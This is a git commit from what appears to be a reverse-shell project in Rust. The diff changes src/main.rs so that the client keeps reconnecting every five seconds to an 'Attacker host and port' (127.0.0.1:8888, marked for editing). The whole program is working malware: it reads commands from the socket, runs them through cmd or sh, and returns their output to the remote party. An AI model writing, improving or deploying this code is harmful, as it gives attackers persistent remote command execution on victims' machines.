d52098ef614308771fb94f2b2177f4e73fc89e69
dmknght <dmknght@protonmail.com>
2019-07-17 22:53:50 +0700

    Sleep 5 seconds if server is not started

--- src/main.rs
+++ src/main.rs
@@ -2,31 +2,38 @@ use std::net::{TcpStream};
 use std::io::{Read, Write};
 use std::str::from_utf8;
 use std::process::Command;
+use std::time::Duration;
+use std::thread;
 
 fn main() {
 	let addr = "127.0.0.1:8888"; // Attacker host and port. EDIT here
-	match TcpStream::connect(addr) { // Try create TCP connection
-		Ok(mut conn) => { // If connected
-			loop { // Create endless loop
-				let mut data = [0; 64]; // Create data
-				match conn.read(&mut data) {
-					Ok (_) => {
-						let mut command = from_utf8(&data).unwrap();
-						/* Remove Null byte in command (Error while running commands*/
-						/* https://stackoverflow.com/a/49406848 */
-						command = command.trim_matches(char::from(0));
-						//if command == "exit" {
-						//	break;
-						//}
-						let output = if cfg!(target_os = "windows") {
-							Command::new("cmd").args(&["/C", command]).output().expect("")
-						} else {
-							Command::new("sh").arg("-c").arg(command).output().expect("")
-						};
-						conn.write(&output.stdout).unwrap();
-					}, Err(_) => {}
+	loop {
+		match TcpStream::connect(addr) { // Try create TCP connection
+			Ok(mut conn) => { // If connected
+				loop { // Create endless loop
+					let mut data = [0; 64]; // Create data
+					match conn.read(&mut data) {
+						Ok(_) => {
+							let mut command = from_utf8(&data).unwrap();
+							/* Remove Null byte in command (Error while running commands*/
+							/* https://stackoverflow.com/a/49406848 */
+							command = command.trim_matches(char::from(0));
+							//if command == "exit" {
+							//	break;
+							//}
+							let output = if cfg!(target_os = "windows") {
+								Command::new("cmd").args(&["/C", command]).output().expect("")
+							} else {
+								Command::new("sh").arg("-c").arg(command).output().expect("")
+							};
+							conn.write(&output.stdout).unwrap();
+						},
+						Err(_) => {}
+					}
 				}
-			}
-		}, Err(_) => {}
+			},
+			Err(_) => {}
+		}
+		thread::sleep(Duration::from_millis(5000))
 	}
 }
